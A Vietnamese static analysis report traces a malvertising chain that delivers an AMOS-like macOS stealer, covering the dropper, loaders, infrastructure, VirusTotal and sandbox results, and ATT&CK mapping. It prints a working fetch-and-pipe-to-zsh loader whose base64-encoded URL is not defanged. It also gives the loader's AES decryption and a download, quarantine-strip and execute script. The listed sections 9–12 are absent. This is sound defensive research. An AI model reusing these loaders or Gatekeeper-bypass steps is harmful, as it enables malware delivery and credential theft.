# Phân tích kỹ thuật: chuỗi lây nhiễm "Wan" → macOS stealer (AMOS-like)

> Ngày phân tích: 14–15/10/2026 · Phương pháp: tĩnh (static), không thực thi mẫu
>
> IOC đã defang. Mẫu được lưu trong `samples.7z` (mật khẩu `infected`). **Chỉ giải nén trong VM Linux cô lập.**

## Mục lục

1. [Tổng quan chuỗi lây nhiễm](#1-tổng-quan-chuỗi-lây-nhiễm)
2. [Hạ tầng](#2-hạ-tầng)
3. [Lớp 0 – Installer.dmg](#3-lớp-0--installerdmg)
4. [Lớp 1 – Installer.app / Wan (Go dropper)](#4-lớp-1--installerapp--wan-go-dropper)
5. [Lớp 2 – wan.cute (GitHub/jsDelivr)](#5-lớp-2--wancute-githubjsdelivr)
6. [Lớp 3 – zsh loader mã hoá AES](#6-lớp-3--zsh-loader-mã-hoá-aes)
7. [Lớp 4 – stage4.bin (packed Mach-O)](#7-lớp-4--stage4bin-packed-mach-o)
8. [MITRE ATT&CK](#8-mitre-attck)
9. [Phát hiện & săn tìm](#9-phát-hiện--săn-tìm)
10. [IOC](#10-ioc)
11. [Giới hạn & câu hỏi mở](#11-giới-hạn--câu-hỏi-mở)
12. [Môi trường phân tích](#12-môi-trường-phân-tích)

## 1. Tổng quan chuỗi lây nhiễm

```
Google search "cleaner app mac" → [Google Ad] → hxxps://cleanerappmac[.]com/appscleaner/?ref=4770fc3bbab0
      └─► hxxps://deepteks[.]com/gdfgsdgs/Installer.dmg                     L0  VT 0/61
            └─ Installer.app (com.yard.wan, Go, Developer ID + notarized)     L1
                 └─ GET cdn.jsdelivr[.]net/gh/puppygirl7cutie/wan2/wan.cute   L2
                      └─ curl hxxps://chantcompass9[.]com/curl/…/o3361gf1ldpasopujs81ui.dat | zsh   L3
                           ├─ POST hxxps://raster-87[.]com/api/metrics/run?event=pasted
                           ├─ GET  hxxps://chantcompass9[.]com/f/a6b64pfdhh2yuqnqrmhhww/dpoxptoi → /tmp/.cid9mtl
                           ├─ xattr -c ; chmod +x
                           ├─ POST hxxps://raster-87[.]com/api/metrics/run?event=stager
                           └─ exec /tmp/.cid9mtl                                L4  VT 15/57 (ESET: OSX/PSW.Agent.KQ)
```

**Thiết kế chính:** mỗi lớp đều không chứa logic độc hại có thể nhận diện. L1 chỉ là HTTP client. L2 là một dòng `curl | zsh`. L3 đã được mã hoá. L4 được pack và làm rối. Payload cuối được phục vụ động từ máy chủ, nên mỗi lần tải có thể ra một bản build khác.

### 1.1 Dòng thời gian nạn nhân và hậu quả quan sát được

| Thời điểm (UTC+7) | Sự kiện | Nguồn |
|---|---|---|
| 14/10/2026 ~18:30 | Nạn nhân bấm Google Ad → `/appscleaner/?ref=4770fc3bbab0`, tải DMG, kéo app ra và **thực thi** Installer.app. **Không có giao diện nào hiện ra** (không cửa sổ, không icon Dock) | Người dùng báo |
| Ngay sau đó | Thường hiện **popup giả đòi mật khẩu Mac** (hành vi của họ mã độc) | Người dùng báo |
| 15/10/2026 ~16:00 | **Tài khoản Facebook của nạn nhân bị chiếm** và phát tán ảnh quảng cáo **lừa đảo crypto mạo danh MrBeast** | Người dùng báo |

**Phân tích:**
- **Popup mật khẩu (T1056.002)** là hành vi thường gặp của họ mã độc này. Popup đó là giả, vì không bước hợp lệ nào trong chuỗi cần quyền admin: L1 đã notarize (Gatekeeper chỉ hỏi xác nhận mở), còn L3 chỉ ghi vào `/tmp`, rồi chạy `xattr -c` và `chmod`. Hộp thoại `osascript` giả đòi mật khẩu là hành vi đặc trưng của họ AMOS/MacSync. Thường đi kèm `dscl . authonly` để kiểm tra mật khẩu và lặp lại cho tới khi đúng. Không xác nhận được trực tiếp trong L4 vì chuỗi đã mã hoá.
- Nếu có mật khẩu đăng nhập Mac, mã độc mở được `login.keychain-db`, lấy khoá **Chrome Safe Storage** và giải mã cookie và mật khẩu của trình duyệt Chromium. Điều này giải thích việc chiếm Facebook mà không cần mật khẩu hay 2FA. Nếu không có mật khẩu, cookie vẫn có thể bị lấy từ trình duyệt khác hoặc theo cách khác.
- Khoảng 21–22 giờ từ lúc lây nhiễm tới lúc tài khoản bị lạm dụng. Con số này khớp với quy trình của các stealer MaaS: log bị gửi về panel, rồi được phân loại theo giá trị và bán lại hoặc giao cho nhóm khai thác.
- Chiếm Facebook mà không cần mật khẩu hay 2FA thường là kết quả của **đánh cắp cookie phiên (session hijacking)**. Đây là bằng chứng gián tiếp cho thấy payload L4 **đã lấy được dữ liệu trình duyệt**, đúng như dự kiến với họ AMOS.
- Tài khoản bị chiếm được dùng làm **kênh phát tán tiếp** (lừa đảo crypto mạo danh người nổi tiếng). Vòng lặp này rất phổ biến: stealer → chiếm tài khoản mạng xã hội → lừa đảo hoặc quảng cáo độc hại để kiếm thêm nạn nhân.
- Máy nạn nhân **đã được reset** nên không còn kiểm tra trực tiếp được. Mối liên hệ nhân quả là suy luận từ thời gian và cách thức.

### 1.2 Kết quả VirusTotal theo lớp

| Lớp | Mẫu | VirusTotal | Ghi chú |
|---|---|---|---|
| L0 | `Installer.dmg` | **0/61** (14/10/2026) · [VirusTotal](https://www.virustotal.com/gui/file/320c777f39a64138a76966ce01557ede0fd5e8fec82c6495c4d020fe1dd94204) | Mẫu người dùng thực sự tải về |
| L1 | `Installer.app/Contents/MacOS/Wan` | Chưa gửi riêng | Nằm trong L0, nên đã được quét như một phần của DMG |
| L2 | `wan.cute` | Chưa gửi | Một dòng shell, gần như không có gì để nhận diện |
| L3 | `o3361gf1ldpasopujs81ui.dat` | Chưa gửi | Payload được mã hoá AES nhúng trong script |
| L4 | `stage4.bin` | [VirusTotal](https://www.virustotal.com/gui/file/8df733ce1f313241964d655f7afc1978d470f7b3e08f603f5212199001798a0e) · Hash **chưa từng tồn tại** trên VT trước khi gửi (15/10/2026). Sau khi gửi: **2/16 engine** (ESET-NOD32 `OSX/PSW.Agent.KQ`, Google). Khoảng 1 ngày sau: **15/57** (mục 7.1), có kết quả sandbox (mục 7.8) | Chỉ lớp cuối mới bị nhận diện |

**Vì sao mẫu ban đầu đạt 0/61:**
- DMG chỉ chứa dropper. Phần độc hại được **tải về lúc chạy**, nên không nằm trong file được quét.
- L1 có chữ ký Developer ID và đã được **notarize**.
- L1 viết bằng Go (13 MB, phần lớn là runtime chuẩn), không có chuỗi hay API đáng ngờ.
- Thêm 50 MB PDF đệm (`clen.zip`) để vượt giới hạn kích thước hoặc độ sâu giải nén của một số engine.
- L4 được tạo theo từng lượt tải (URL có token riêng), nên hash mới hoàn toàn và không có trong cơ sở dữ liệu signature.

**Hệ quả với phòng thủ:** quét file tĩnh tại thời điểm tải về không đủ. Cần thêm phát hiện theo **hành vi** (mục 9.1) và chặn theo **danh tiếng hạ tầng** (domain mới, malvertising).

## 2. Hạ tầng

Dữ liệu RDAP tra ngày 15/10/2026:

| Domain | Vai trò | Đăng ký | Registrar | NS |
|---|---|---|---|---|
| `cleanerappmac[.]com` | Landing page (referrer) | 2026-10-11 23:41 UTC | Dominet (HK) Limited | Cloudflare |
| `deepteks[.]com` | Host file DMG | 2025-05-12 (đổi 2026-05-13) | Cloudflare, Inc. | Cloudflare |
| `chantcompass9[.]com` | Phát tán L3 và L4 | 2026-10-13 10:53 UTC | Dominet (HK) Limited | Cloudflare |
| `raster-87[.]com` | Beacon / telemetry | 2026-09-25 21:20 UTC | Dominet (HK) Limited | Cloudflare |
| `github[.]com/puppygirl7cutie/wan2` | Staging L2 (qua jsDelivr CDN) | — | — | — |

**Đường vào:** quảng cáo Google dẫn **thẳng tới `/appscleaner/?ref=4770fc3bbab0`** (URL đích của quảng cáo đã gắn sẵn mã affiliate). Nút Download tải trực tiếp `hxxps://deepteks[.]com/gdfgsdgs/Installer.dmg`, không qua redirect.

**Cloaking theo tham số** (quan sát ngày 15/10): root `/` trả 404, trong khi URL đích của quảng cáo (`/appscleaner/?ref=<affiliate>`) vẫn phục vụ trang tải. Đây là cloaking theo tham số hoặc đường dẫn, kỹ thuật phổ biến của các chiến dịch malvertising:
- Reviewer hoặc crawler của nền tảng quảng cáo và các trình quét URL thường kiểm tra root domain, nên chỉ thấy 404.
- Chỉ request có `ref` hợp lệ mới thấy nội dung. Mã `ref` đồng thời dùng để tính tiền cho affiliate.
- Thường đi kèm lọc theo User-Agent (macOS), IP hoặc ASN (loại datacenter, VPN, IP của hãng bảo mật), referrer (`google.com`, `gclid`), và giới hạn số lần tải. **Chưa kiểm chứng** các bộ lọc này với landing page này.

Hệ quả: khi quét hoặc lấy mẫu cần giữ **nguyên URL có tham số**, và nếu có thể thì mô phỏng User-Agent macOS và referrer. Quét root domain sẽ cho kết quả "sạch" sai.

`ref=4770fc3bbab0` khớp với mô hình **traffer/affiliate** thường thấy ở các stealer macOS bán theo dạng MaaS (Malware-as-a-Service). Header `user:`/`BuildID:` ở L3 có thể cũng gắn với ID affiliate này (suy luận).

**Nhận xét:**
- Ba domain cùng registrar ở HK và cùng núp sau Cloudflare. `chantcompass9` được đăng ký **khoảng 1 ngày** trước khi mẫu được tải về.
- `deepteks[.]com` có tuổi lâu hơn. Có thể đây là domain "nuôi" sẵn hoặc bị chiếm quyền để vượt qua các bộ lọc chặn domain mới.
- File `wan.cute` trên GitHub được commit "Update wan.cute" khoảng 15 giờ trước thời điểm phân tích, tức là URL L3 được xoay vòng thường xuyên.
- Nguồn quảng cáo Google Ads là thông tin do người dùng báo lại. Nội dung landing page chưa được lưu lại.

## 3. Lớp 0 – Installer.dmg

| Thuộc tính | Giá trị |
|---|---|
| SHA-256 | `320c777f39a64138a76966ce01557ede0fd5e8fec82c6495c4d020fe1dd94204` · [VirusTotal](https://www.virustotal.com/gui/file/320c777f39a64138a76966ce01557ede0fd5e8fec82c6495c4d020fe1dd94204) |
| Kích thước | 43 584 135 byte |
| Định dạng | UDIF read-only, nén lzfse, bên trong là APFS |
| Chữ ký DMG | Developer ID Application: **URAZ SESTMER (YXSRL98558)**, ký ngày 2026-10-10 03:00:33 |
| Gatekeeper | `spctl`: **rejected**, `source=Unnotarized Developer ID` (bản thân DMG chưa notarize) |
| `kMDItemWhereFroms` | `hxxps://deepteks[.]com/gdfgsdgs/Installer.dmg`, `hxxps://cleanerappmac[.]com/` |
| Quarantine | `0081;…;Chrome;…` |

**Nội dung:**
```
Installer.app/            ← L1
clen.zip   (34 577 274 B) ← padding
.background/dmgcanvas_bg.tiff, .VolumeIcon.icns, .DS_Store
```

`clen.zip` chứa `Users/admin/Downloads/clen/clen1.pdf` và `clen2.pdf`. Hai file **giống hệt nhau**, mỗi file 25 047 210 byte (header `%PDF-2.0`). Mục đích là **thổi phồng kích thước** để vượt giới hạn quét của một số engine. Đường dẫn `Users/admin/Downloads` là dấu vết từ máy build của kẻ tấn công. File `.background/dmgcanvas_bg.tiff` cho thấy DMG được tạo bằng **DMG Canvas**.

## 4. Lớp 1 – Installer.app / Wan (Go dropper)

| Thuộc tính | Giá trị |
|---|---|
| Bundle ID | `com.yard.wan` · Display name "Wan" · v1.0.3 (4) · min macOS 11.0 |
| `LSUIElement` | `true`: không có icon trên Dock, không có menu bar. Khớp với trải nghiệm của nạn nhân: mở app mà **không thấy gì hiện ra**, trong khi dropper chạy ngầm |
| Binary | `Contents/MacOS/Wan`, Mach-O universal (x86_64 + arm64), 13 385 248 byte |
| Ngôn ngữ | Go (runtime, `net/http`, `os/exec`, `crypto/tls`) |
| Chữ ký | Cùng Developer ID YXSRL98558, ký ngày 2026-10-10 02:42:06, hardened runtime (`flags=0x10000`) |
| Notarization | **Ticket stapled**: app đã được Apple notarize |

**Symbol của package `main`** (tên ngụy trang theo chủ đề "chó cưng"):
```
main.checkGate  main.pullCute  main.dropCute  main.cuteOwned  main.keep
main.supportDir main.wanAppPath main.home     main.writePostcard
main.daySeed    main.weekSeed  main.routeOfDay main.sniffOfDay main.walkOf
main.touchLoyalty main.touchZoomies main.bark main.offer main.issue main.stars …
```

**URL nhúng:** `hxxps://cdn.jsdelivr[.]net/gh/puppygirl7cutie/wan2`

**Suy luận** (chưa disassemble đầy đủ):
- `pullCute` / `dropCute` tải `*.cute` từ repo rồi thực thi qua `os/exec`.
- `checkGate`, `daySeed`, `routeOfDay` gợi ý có điều kiện kích hoạt theo thời gian hoặc môi trường.
- `supportDir`, `keep`, `wanAppPath` gợi ý có ghi file vào `~/Library/Application Support` hoặc cơ chế lưu trú (persistence).
- Có chuỗi gây nhiễu (`"can't sit. won't sit. wag engine."`, `front gate`, `park swing`…) và `/System/Library/Sounds/Glass.aiff`.

**Lý do VirusTotal 0/61:** binary được ký và notarize, viết bằng Go với phần lớn là thư viện chuẩn, không có chuỗi độc hại, và hành vi chỉ là "tải rồi chạy".

## 5. Lớp 2 – wan.cute (GitHub/jsDelivr)

Toàn bộ nội dung file:
```sh
# WAN_CUTE
curl -s $(echo "aHR0cHM6Ly9jaGFudGNvbXBhc3M5LmNvbS9jdXJsL2QwNWwxenVoZTZ6YS9vMzM2MWdmMWxkcGFzb3B1anM4MXVpLmRhdA==" | openssl base64 -d -A) | zsh
```
Chuỗi base64 giải ra `hxxps://chantcompass9[.]com/curl/d05l1zuhe6za/o3361gf1ldpasopujs81ui.dat`.

Việc dùng **GitHub và jsDelivr** làm trạm trung chuyển giúp vượt qua bộ lọc domain và proxy doanh nghiệp, vì các domain này có uy tín cao.

## 6. Lớp 3 – zsh loader mã hoá AES

### 6.1 Lớp vỏ ngụy trang
- Header `# kgmlg6r4 v3.10.6`, kèm các khối "cache maintenance" và "hardware inventory" giả để trông giống script bảo trì (`df -m /`, `find ~/Library/Caches -mtime +21`, `sysctl hw.model`, kiểm tra Rosetta `oahd`).
- Tên lệnh được mã hoá octal để né grep:

| Biến | Octal | Giá trị |
|---|---|---|
| `nsk9x` | `\155\144\065` | `md5` |
| `etaco` | `\170\170\144` | `xxd` |
| `vz3se` | `\157\160\145\156\163\163\154` | `openssl` |
| `nzcr`+`lvpj` | `'gunz'`+`'ip'` | `gunzip` |

### 6.2 Giải mã
```sh
_kb=$(( _timeout_s*1337 + ${#_flavor} % 4096 + ${#_track} ))   # 147*1337 + 4 + 6 = 196549
_k=$(printf '%s' "$_kb" | md5)                                  # 2fea0f810969c4c811b998346bb4026f
_r=$(printf '%s' "$_rollout_key$_cache_seed$_schema_id$_feature_flags$_license_salt" \
     | xxd -r -p \
     | openssl enc -d -aes-128-ctr -K "$_k" -iv 00000000000000000000000000000000 \
     | gunzip)
eval "$_r"
```
- **Thuật toán:** AES-128-CTR với IV toàn số 0, rồi giải nén gzip.
- **Khoá:** `md5("196549")`, được tính từ các biến trông như "tham số cấu hình".
- **Ciphertext:** ghép 5 chuỗi hex theo thứ tự *rollout_key → cache_seed → schema_id → feature_flags → license_salt*. Biến `_probe_salt` là mồi nhử, không được dùng.
- Kết quả: 1 807 byte script zsh.

### 6.3 Script sau giải mã (đã defang và rút gọn)
```sh
uid=$(id -u); mem=$(sysctl -n hw.memsize); user=$(whoami); ts=$(date +%s)   # thu thập, chưa thấy được gửi đi

curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST \
  -H 'user: AgJDLYqVfXWWVlhYveHxZRzaKYO8mKcM7kqNa_R8N1cHRmNd46fi' \
  -H 'BuildID: AgLzbA1qGBEcmxGAk9qtrq1KJZ4mn33xSj73Nwn8uxFZfoz9626G' \
  "hxxps://raster-87[.]com/api/metrics/run?event=pasted" &

curl -fsSL -o /tmp/.cid9mtl.$$ hxxps://chantcompass9[.]com/f/a6b64pfdhh2yuqnqrmhhww/dpoxptoi \
 && mv /tmp/.cid9mtl.$$ /tmp/.cid9mtl \
 && xattr -c /tmp/.cid9mtl \
 && chmod +x /tmp/.cid9mtl \
 && { curl … -H 'user: AgI3k34rsGWcGvemRFTBjF4UuDKSo6fYZaUH8Zhsp2qaM1plFJ4v' \
              -H 'BuildID: AgIj6gSPZd-rIMOgd1tyaL6A-zZHkxl345lBoVxQ-OO54xYlSnT5' \
              "hxxps://raster-87[.]com/api/metrics/run?event=stager" & } \
 && /tmp/.cid9mtl
```
Các URL và tên file trong script gốc đều được viết bằng octal (`printf '\150\164…'`).

**Nhận xét:**
- `xattr -c` **xoá thuộc tính quarantine** để vượt Gatekeeper và XProtect khi chạy.
- File được ghi vào đường dẫn tạm có `$$` (PID) rồi `mv` sang tên cuối, để tránh race condition.
- Tham số `event=pasted` gợi ý cùng loader này **được dùng cho cả chiến dịch kiểu "ClickFix"**, tức là lừa nạn nhân tự dán lệnh vào Terminal. Header `user` và `BuildID` có thể là ID chiến dịch, affiliate hoặc build.
- Các biến `qljy3s0`, `h8h38`, `w18wgtnq` ở cuối script là code rác.

## 7. Lớp 4 – stage4.bin (packed Mach-O)

### 7.1 Thông tin chung
| Thuộc tính | Giá trị |
|---|---|
| SHA-256 | `8df733ce1f313241964d655f7afc1978d470f7b3e08f603f5212199001798a0e` · [VirusTotal](https://www.virustotal.com/gui/file/8df733ce1f313241964d655f7afc1978d470f7b3e08f603f5212199001798a0e) · [Behavior](https://www.virustotal.com/gui/file/8df733ce1f313241964d655f7afc1978d470f7b3e08f603f5212199001798a0e/behavior) |
| Kích thước | 1 233 232 byte |
| Định dạng | Mach-O universal: x86_64 (offset `0x4000`, 572 144 B) + arm64 (offset `0x90000`, 643 408 B) |
| Chữ ký | Không thấy chuỗi Developer ID hay Apple Root CA (không ký bằng Developer ID) |
| VirusTotal | Lần đầu được thấy khi upload ngày 15/10/2026. Ban đầu 2/16 (**ESET-NOD32: `OSX/PSW.Agent.KQ`**, Google), sau đó 11/63, rồi **15/57** (15/10/2026) |
| MD5 / SHA-1 | `896bf5b2d446346e11719064750035e4` / `4b5988352f0dba97800ee9496f372b999ab1022b` |
| CDHash | `076a12c96b244b4e1e9d4ac6160c52ce79ab7f94` |
| Tên VT ghi nhận | `org.slack.notifier`: định danh trong chữ ký, **mạo danh Slack** |
| Tag VT | `macho`, `multi-arch`, `self-signed`, `arm`, `64bits`, `checks-cpu-name`, `checks-vm` |
| Lưu trữ | VirusTotal, MalShare |

**Tên nhận diện trên VirusTotal (15/57):**

| Engine | Tên |
|---|---|
| ESET-NOD32 | `OSX/PSW.Agent.KQ` |
| Kaspersky | `HEUR:Trojan-PSW.OSX.Agent.ar` |
| Sophos / ZoneAlarm | `OSX/InfoStl-IP` |
| Avast / AVG | `MacOS:Agent-BWZ [Pws]` |
| Avira / WithSecure | `TR/OSX.Agent.BXQ` |
| AliCloud | `Trojan[stealer]:MacOS/Agent.KZ` |
| Fortinet | `MAC/Agent.KI!tr` |
| Symantec | `OSX.Trojan.Gen` |
| Microsoft | `Trojan:Script/Wacatac.B!ml` |
| Tencent | `Osx.Trojan.LummaStealer.Wdkl` |
| Cynet, McAfee Scanner | Malicious |

Đa số engine phân loại là **password/info stealer** (`PSW`, `InfoStl`, `[Pws]`, `[stealer]`), khớp với kết luận phân tích. Nhãn "LummaStealer" của Tencent nhiều khả năng là nhận diện chung chung, vì Lumma là stealer cho Windows. Chưa có engine nào gắn tên họ cụ thể như AMOS hay MacSync.

URL tải có token riêng (`a6b64pfdhh2yuqnqrmhhww`), nhiều khả năng server **build lại cho mỗi lượt tải** để hash luôn khác nhau.

### 7.2 Section (slice arm64)
| Section | Kích thước | Quyền | Ghi chú |
|---|---|---|---|
| `__TEXT.__text` | `0x32280` (205 440 B) | r-x | Chỉ 56 hàm được r2 nhận diện |
| `__TEXT.__const` | `0xe16` | r-x | |
| `__TEXT.__cstring` | **`0x11` (17 B)** | r-x | Gần như không có chuỗi rõ |
| `__DATA_CONST.__mod_init_func` | 8 B | rw- | **1 constructor** → `entry.init0` |
| **`__DATA_CONST.__const`** | **`0x629b0` (≈ 404 KB)** | rw- | **Blob mã hoá** (≈ 1 700 chuỗi base64) |
| `__DATA.__la_symbol_ptr` | `0x50` | rw- | 10 lazy pointer |

Các segment: `__TEXT` r-x, `__DATA_CONST` rw-, `__DATA` rw-, `__LINKEDIT` r--. **Không có segment nào vừa ghi vừa thực thi (W+X).**

### 7.3 Import
Bảng symbol liệt kê 64 import. Trong đó chỉ **10 symbol có stub hoặc lazy pointer** (tức là thật sự được gọi):
```
__clear_cache  __stack_chk_fail  free  getpid  malloc  memcpy
pthread_once   strlen            task_info  time
```
54 import còn lại (`fopen`, `fwrite`, `rename`, `chmod`, `getenv`, `asctime`, `rand`, `tmpnam`, `mach_task_self_`…) **không có stub**. Có thể chúng được thêm vào để gây nhiễu, hoặc được bind theo cách khác. Chưa xác minh.

Một điểm cần xác minh thêm: chuỗi `_system` xuất hiện khi chạy `strings` trên file fat, nhưng không có trong bảng import của slice arm64. Chưa kiểm tra riêng slice x86_64.

### 7.4 Dữ liệu mã hoá
- 3 400 chuỗi base64 có độ dài ≥ 100 (1 700 chuỗi duy nhất, do mỗi chuỗi lặp lại ở cả 2 slice). Độ dài thay đổi từ 118 đến 370 ký tự.
- Giải mã base64 chuẩn cho ra dữ liệu có entropy khoảng 7.2 trên khối 277 B (gần mức tối đa với kích thước này), tỉ lệ ký tự in được khoảng 0.4.
- **Không** giải được bằng XOR 1 byte. **Không** tìm thấy bảng chữ cái base64 tuỳ biến dạng liên tục trong file.

### 7.5 Luồng thực thi (tĩnh, r2 6.0.7, slice arm64)
**`entry.init0` @ `0x10002a3dc`** (2 316 B, 76 khối lệnh) chạy **trước `main`**:
- `0x10002a660`: `ldr x8, [x8, 0x40]` tham chiếu `0x100034040`, tức **đầu blob mã hoá**.
- `0x10002a770`: một hằng nhị phân khoảng 300 B, nghi là khoá hoặc bảng giải mã. `0x10002a7e8`: chuỗi kiểu base64 `j9jSHvqHg08h5JLeuc…`.
- `0x10002a7fc`: lấy **địa chỉ** `__clear_cache` và truyền vào `fcn.10002b114` (gọi gián tiếp qua con trỏ hàm).
- Chuỗi gọi hàm: `fcn.10002af28 → fcn.10002af40 (×2) → fcn.10002b104 → fcn.10002b114 → fcn.10002b1e0 → fcn.10002b2a0 → fcn.10002c874 → fcn.10002c9c8 → fcn.10002d504 → fcn.10002df08 → fcn.10002e4dc → fcn.10002e75c → fcn.10002e7b8 → fcn.10002ea54 → fcn.10002ebdc → fcn.10002f9d4 → fcn.1000312c8`.
- `fcn.10002af40` gọi `fcn.1000322c0` (1 092 B) hai lần: **ứng viên cho lõi thuật toán mã hoá**.
- `getpid()` và `time()` được gọi **hai lần**, cách nhau một chuỗi xử lý. Nhiều khả năng là kiểm tra độ trễ để phát hiện debugger hoặc sandbox (suy luận).

**`main` @ `0x1000313e8`:** gọi `memcmp`, rồi gọi `fcn.100000c78` hai lần.

**Vùng `0x100000c78`–`0x10002a3dc` (khoảng 170 KB)** hầu như không được r2 nhận diện là hàm. Entropy khoảng 5.6–5.9, tức là code máy bình thường chứ không phải dữ liệu mã hoá.

### 7.6 Kỹ thuật làm rối: Mixed Boolean-Arithmetic
`fcn.100000c78` có 744 B trong **một khối lệnh duy nhất**, nhận `(w0, w1)` và trả về `w0`. Toàn bộ là chuỗi phép tính `eor/sub/and/mul/madd` với hằng số lớn:
```asm
0x100000c78  eor  w8, w1, w0
0x100000c7c  sub  w9, w0, w1
0x100000c80  sub  w8, w9, w8
0x100000c84  mov  w9, 0xcc93
0x100000c88  movk w9, 0xdbf, lsl 16      ; 0x0dbfcc93
0x100000c8c  eor  w9, w8, w9
…
0x100000f44  mul  w9, w9, w11
0x100000f50  madd w10, w10, w11, w9      ; w11 = 0x1f117c29
0x100000f58  eor  w0, w8, w10
0x100000f5c  ret
```
Đây là **MBA obfuscation**: một phép toán đơn giản (nghi là cộng hoặc XOR) được biến thành biểu thức tương đương phức tạp. Kỹ thuật này là đặc trưng của các obfuscator dựa trên LLVM (họ O-LLVM / Hikari hoặc bản thương mại). Vùng 170 KB nhiều khả năng chứa hàng trăm hàm như vậy, được gọi gián tiếp, nên công cụ phân tích tự động bỏ sót.

### 7.7 Giả thuyết hoạt động (phân tích tĩnh)
1. `entry.init0` giải mã blob 404 KB trong `__DATA_CONST.__const` (rw-) bằng khoá nhúng, với thuật toán nằm ở `fcn.1000322c0`.
2. Kiểm tra môi trường bằng `task_info`, `getpid` và độ trễ `time`.
3. `__clear_cache` được dùng cho vùng nhớ chứa code hoặc dữ liệu vừa sinh ra. **Chưa xác định** cơ chế cấp quyền thực thi, vì không thấy import `mprotect`/`mmap`/`vm_protect`/`dlsym` và không có `svc #0x80`.
4. `main` kiểm tra tính toàn vẹn (`memcmp` với giá trị MBA), rồi chuyển quyền cho payload đã giải mã.

Payload cuối là stealer. Theo phân loại của ESET (`PSW` = Password Stealer) và đặc điểm của họ AMOS, hành vi dự kiến gồm:
- Hộp thoại `osascript` giả để lấy mật khẩu.
- Kiểm tra mật khẩu bằng `dscl . authonly`.
- Lấy Keychain, dữ liệu trình duyệt (bao gồm khoá "Chrome Safe Storage"), ví crypto, Telegram, Notes, file trong Desktop/Documents.
- Nén lại rồi gửi về C2 bằng HTTP POST.

**Các hành vi này chưa được xác minh trực tiếp trên mẫu.**

### 7.8 Sandbox VirusTotal (Behavior)

Nguồn: https://www.virustotal.com/gui/file/8df733ce1f313241964d655f7afc1978d470f7b3e08f603f5212199001798a0e/behavior

Hai sandbox đã chạy mẫu: **VirusTotal MacOS Mirage** và **Zenbox macOS**.

**Lệnh được thực thi:**
```
./stage4.bin
zsh -c osascript -l JavaScript          ← chạy JXA (AppleScript viết bằng JavaScript), nhiều lần
/usr/sbin/system_profiler -xml -micro
/usr/sbin/system_profiler -nospawn -xml <Type> -detailLevel full
    Type = SPHardware, SPDisplays, SPMemory, SPAirPort, SPModem, SPBluetooth, SPNetwork,
           SPPCI, SPSerialATA, SPParallelATA, SPParallelSCSI, SPFibreChannel, SPUSB,
           SPFireWire, SPThunderbolt
/bin/ps -p <pid> -c -o comm=
```
Sandbox còn ghi lại `launchctl unload … com.apple.smbd.plist` và `killall -HUP smbd/netbiosd`, nhưng có thể là tiến trình nền của sandbox. Chưa gán cho mẫu.

**Nhận xét:**
- **`osascript -l JavaScript`** khớp với hành vi của họ AMOS/MacSync: JXA dùng để hiện **hộp thoại giả đòi mật khẩu** và thu thập dữ liệu (T1059.002). Không có văn bản hộp thoại nào được ghi lại (mục "Highlighted text" trống).
- **Quét hơn 15 loại phần cứng bằng `system_profiler`** là kỹ thuật **phát hiện máy ảo hoặc sandbox** (T1497.001, T1082). Máy ảo thường thiếu Bluetooth/Wi-Fi thật, có card màn hình và PCI ảo. VT gắn tag `checks-vm` và `checks-cpu-name`.
- Sau các bước trên, `stage4.bin` **tự kết thúc**. Không có HTTP request nào được ghi lại.

**Mạng (61 kết nối):**

| Nhóm | IP | Đánh giá |
|---|---|---|
| Apple | `17.0.0.0/8` (khoảng 40 IP) | Lưu lượng nền của macOS |
| Akamai / Fastly | `23.x`, `184.x`, `2.16.x`, `2.23.x`, `151.101.3.6` | CDN của Apple (`s.mzstatic.com`, `*.akamaiedge.net`) |
| AWS | `15.217.253.113`, `16.192.109.252`, `51.94.136.141` | Không có DNS đi kèm, chưa xác định |
| **Cloudflare, TCP/80** | `172.64.149.23`, `104.18.38.233`, `162.159.142.9` | Đáng chú ý nhưng **không gán được**. IP Cloudflare dùng chung cho rất nhiều site, và **không khớp** IP hiện tại của các domain trong chiến dịch (`chantcompass9`: `172.67.193.176`/`104.21.12.55`; `raster-87`: `104.21.72.201`/`172.67.187.79`) |

DNS chỉ ghi nhận `s.mzstatic.com`, `e4805.dsca.akamaiedge.net`, `e5977.dsce9.akamaiedge.net`.

**Kết luận:** sandbox **không lộ ra C2**. Nhiều khả năng mẫu đã nhận ra môi trường ảo và dừng trước khi đánh cắp hoặc gửi dữ liệu.

Behavior similarity hash: Mirage `5fdf4ae1b96cbe31357f9c055b792a0b`, Zenbox `69ca7185d9f06e9620af81ac15905c2a`.

## 8. MITRE ATT&CK

| Tactic | Technique | Bằng chứng |
|---|---|---|
| Resource Development | T1583.001 Domains · T1583.008 Malvertising | Domain mới vài ngày tuổi; quảng cáo Google |
| Defense Evasion | T1665 Hide Infrastructure | Cloaking: root trả 404, chỉ URL có `?ref=` phục vụ nội dung |
| Resource Development | T1608.001 Upload Malware | GitHub `puppygirl7cutie/wan2`, `chantcompass9[.]com/f/…` |
| Resource Development | T1588.003 Code Signing Certificates | Developer ID YXSRL98558 |
| Initial Access | T1189 Drive-by Compromise | Landing page → tải DMG |
| Execution | T1204.002 User Execution: Malicious File | Người dùng phải mở `Installer.app` |
| Execution | T1059.004 Unix Shell | `curl … \| zsh`, `eval "$_r"` |
| Execution | T1059.002 AppleScript | **Sandbox**: `osascript -l JavaScript` (JXA) |
| Defense Evasion | T1036 Masquerading | Định danh `org.slack.notifier` (mạo danh Slack) |
| Defense Evasion / Discovery | T1497.001 System Checks · T1082 System Information Discovery | **Sandbox**: `system_profiler` quét hơn 15 loại phần cứng; tag `checks-vm` |
| Defense Evasion | T1553.001 Gatekeeper Bypass | `xattr -c /tmp/.cid9mtl` |
| Defense Evasion | T1027 Obfuscated Files · T1027.002 Software Packing · T1140 Deobfuscate/Decode | Octal, AES-CTR + gzip, MBA, blob mã hoá |
| Defense Evasion | T1564.001 Hidden Files | `/tmp/.cid9mtl`, `LSUIElement` |
| Defense Evasion | T1497.003 Time Based Evasion | `getpid`/`time` ×2 (suy luận) |
| Command & Control | T1105 Ingress Tool Transfer | Tải L2, L3, L4 |
| Command & Control | T1071.001 Web Protocols | Beacon HTTPS tới `raster-87[.]com` |
| Credential Access | T1056.002 GUI Input Capture | *Dự kiến theo họ AMOS/MacSync* |
| Credential Access | T1555.001 Keychain · T1555.003 Web Browsers | *Dự kiến theo họ AMOS*, khớp với việc cookie Facebook bị dùng |
| Credential Access | T1539 Steal Web Session Cookie | **Quan sát gián tiếp**: Facebook bị chiếm khoảng 22 giờ sau lây nhiễm |
| Exfiltration | T1041 Exfiltration Over C2 Channel | *Dự kiến* |
